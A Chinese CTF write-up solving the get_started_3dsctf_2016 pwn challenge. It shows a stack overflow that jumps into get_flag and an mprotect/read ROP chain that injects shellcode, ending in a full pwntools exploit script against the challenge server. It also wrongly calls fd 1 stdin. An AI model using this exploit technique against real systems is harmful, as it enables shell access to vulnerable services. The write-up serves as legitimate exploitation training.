首先看到main函数

![image-20200730150103790](https://static.hack1s.fun/images/2021/02/06/image-20200730150103790.png)

一个printf一个gets，main函数的逻辑还是挺简单的

看到旁边的函数，有一个`get_flag`

![image-20200730151448182](https://static.hack1s.fun/images/2021/02/06/image-20200730151448182.png)

这里的`get_flag`不是简单的直接读文件，还存在两个条件判断，判断了a1、a2两个数的值

而这两个数是`get_flag`的参数，也就是说在构造payload的时候需要将a1、a2两个参数的值附上，或者需要直接跳转到这两个条件判断之后的代码

差点忘了要检查一下安全机制：

![image-20200730154608035](https://static.hack1s.fun/images/2021/02/06/image-20200730154608035.png)

发现开启了NX，不过这里开了NX也影响不大，毕竟二进制程序本身就包含了读文件的函数，直接跳转过去执行就可以了

TextView里面看一下`get_flag`的地址偏移

![image-20200730154806723](https://static.hack1s.fun/images/2021/02/06/image-20200730154806723.png)

按着这个思路本来写了这样的一个payload

```python
payload = "a"*0x38 + "a"*4 + p32(0x80489a0)
```

但是程序自己直接就退出了，而且连本来的printf都不输出了

改成

```python
payload = "a"*0x38 + p32(0x80489a0)
```

这样之后，printf就可以输出了，但是还是没有读到flag里面的内容；这一步其实有些问题，为什么不用覆盖ebp呢，没有这四个a的话地址不是覆盖着ebp而不是ra吗？

之后如果改成

```python
payload = 'a'*0x38 + p32(0x80489b8)
```

这样会直接跳到两个条件判断之后，就可以读出来flag的内容了

![image-20200731111433918](https://static.hack1s.fun/images/2021/02/06/image-20200731111433918.png)

但是这样的程序其实是存在问题的，因为直接跳转到了flag函数的内部，会导致栈帧不平衡

看了网上的一些方法之后，其实还有更好的办法

函数表中存在一个`mprotect`函数

![image-20200731120253306](https://static.hack1s.fun/images/2021/02/06/image-20200731120253306.png)

这个函数作用是修改用户态内存段的权限

```c
int mprotect(const void *start, size_t len, int prot);
```

会把从`start`开始，长度为`len`的内存空间权限修改为`prot`

其中prot取值有四个

- `PROT_READ`
- `PROT_WRITE`
- `PROT_EXEC`
- `PROT_NONE`

程序函数表中引入了这个函数，就可以首先用这个函数修改bss段中的一部分为可执行，之后用read函数写入shellode，最后再跳转到shellcode

指定的内存大小至少要是一个内存页(4k)，并且起始位置也必须是一个内存页的开始位置

首先可以看一下进程的内存空间，将进程后台运行后直接查看`/proc/pid/maps`，这里会写出来进程内存空间的权限和起始地址

![image-20200731121934216](https://static.hack1s.fun/images/2021/02/06/image-20200731121934216.png)

图例可以看到进程在`80ea000`到`80ec000`的区域是可以读写的，并且属于进程自己的空间

所以我们可以选这里的中间，`80eb000`这里开始，增加一段具有执行权限的区域，想要执行的语句应该是

```C
mprotect(0x80eb000,0x1000,7);
```

这条指令之后，从`0x80eb000`这里到`0x80ed000`这一段内存就变成了可读可写可执行的权限，下面就需要向其中写入shellcode

调用mprotect这里函数结束之后，下面想要调用read函数，但是这时堆栈中mprotect的三个参数就占了位置，所以需要pop出来3个参数，调整堆栈，使得read函数的地址在栈顶，这样就可以直接用ret跳转到read函数的位置，所以用ROPGadget再搜索一下三个pop的gadget

![image-20200731190353655](https://static.hack1s.fun/images/2021/02/06/image-20200731190353655.png)

得到这样的一条指令。下面payload就需要调用mprotect，并且平衡堆栈

```python
payload = 'a'*0x38 + p32(mprotect) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3)
```

这三个pop的gadget的位置是mprotect执行完后的下一条指令

read函数定义如下

```c
ssize_t read(int fd,void *buf,size_t count;) 
```

这里想要执行的是将shellcode从输入直接写到内存，所以fd可以设为1，表示从标准stdin接受输入

```python
payload += p32(read) + p32(1) + p32(0x80ec000) + p32(0x1000)
```

当read被执行之后程序应该是又一次进入了等待输入的状态，这时就发送另一个payload，用于获取到权限;这个可以用pwntools自带的shellcraft来生成

```python
payload2 = asm(shellcraft.sh(),arch='i386',os='linux')
```

 这个发送过去之后进入`interactive`状态就可以了



```python
from pwn import *

io = remote('node3.buuoj.cn',26403)
#io = process('./get_started_3dsctf_2016')
elf = ELF('./get_started_3dsctf_2016')

mprotect = elf.symbols['mprotect']
read = elf.symbols['read']

pop3_addr = 0x80483b8

payload1 = 'a'*0x38 + p32(mprotect) + p32(pop3_addr) + p32(0x80eb000) + p32(0x1000) + p32(7)

payload1 += p32(read) + p32(1) + p32(0x80eb000) + p32(0x100)

payload2 = asm(shellcraft.sh(),arch='i386',os='linux')

io.sendline(payload1)
io.sendline(payload2)

io.interactive()
```

